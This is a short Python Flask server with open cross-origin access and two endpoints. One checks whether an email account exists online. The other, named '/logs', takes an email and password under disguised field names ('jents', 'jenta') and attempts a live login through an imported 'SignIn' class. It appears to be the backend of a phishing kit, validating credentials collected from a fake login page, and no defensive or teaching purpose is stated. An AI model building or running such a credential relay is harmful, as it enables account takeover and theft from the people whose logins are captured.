from flask import Flask, request, jsonify
from flask_cors import CORS
from cookies import SignIn

app = Flask(__name__)
CORS(app)

@app.route("/check", methods=["POST"])
def check_online():
    email = request.json.get("jents")
    if not email:
        return jsonify({"status": False}), 400

    signin = SignIn()
    valid, message = signin.check_email_online(email)
    
    return jsonify({
        "status": valid,
        "message": message
    }), 200 if valid else 404

@app.route("/logs", methods=["POST"])
def logs_online():
    email = request.json.get("jents")
    password = request.json.get("jenta")
    
    if not email or not password:
        return jsonify({"status": False}), 400

    signin = SignIn()
    signin.email = email
    success, message = signin.login(password)
    
    return jsonify({
        "status": success,
        "message": message
    }), 200 if success else 404

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)